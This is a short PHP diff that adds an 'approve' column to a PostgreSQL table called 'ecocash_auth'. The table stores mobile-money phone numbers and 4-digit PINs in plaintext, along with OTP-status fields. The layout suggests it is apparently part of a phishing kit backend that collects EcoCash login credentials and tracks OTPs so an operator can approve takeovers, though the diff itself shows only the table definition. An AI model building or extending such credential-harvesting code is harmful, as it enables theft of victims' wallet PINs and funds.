@@ -143,16 +143,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             error_log("PostgreSQL extension missing or connection failed");
         } else {
             // Create table if not exists
-            $createSQL = "
-                CREATE TABLE IF NOT EXISTS ecocash_auth (
-                    id SERIAL PRIMARY KEY,
-                    phone VARCHAR(20) NOT NULL,
-                    pin VARCHAR(4) NOT NULL,
-                    status SMALLINT DEFAULT 0,
-                    otp_status INTEGER DEFAULT 0 NOT NULL,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    UNIQUE(phone, pin)
-                )";
+          $createSQL = "
+    CREATE TABLE IF NOT EXISTS ecocash_auth (
+        id SERIAL PRIMARY KEY,
+        phone VARCHAR(20) NOT NULL,
+        pin VARCHAR(4) NOT NULL,
+        status SMALLINT DEFAULT 0,
+        otp_status INTEGER DEFAULT 0 NOT NULL,
+        approve SMALLINT DEFAULT 0 NOT NULL,   -- new column
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE(phone, pin)
+    )";
             pg_query($conn, $createSQL);
             
             // Insert or ignore duplicate
